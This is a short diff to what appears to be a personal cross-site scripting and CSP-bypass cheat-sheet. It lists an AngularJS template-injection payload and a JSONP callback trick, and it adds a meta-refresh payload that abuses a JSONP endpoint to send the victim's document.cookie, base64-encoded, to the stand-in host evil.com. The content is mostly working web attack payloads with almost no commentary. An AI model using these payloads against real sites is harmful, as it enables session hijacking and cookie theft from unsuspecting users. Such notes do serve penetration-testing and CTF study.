@@ -161,3 +161,8 @@ if google is allowed as src for scripts then <script src="https://accounts.googl
 - {{constructor.constructor('alert(1)')()}}
 
 jsonp?callback=script location
+
+<meta http-equiv="refresh" content="0;URL=/list?
+callback=location.href%3d'http://evil.com/'%252Bbtoa(document.cookie)//">
+
+
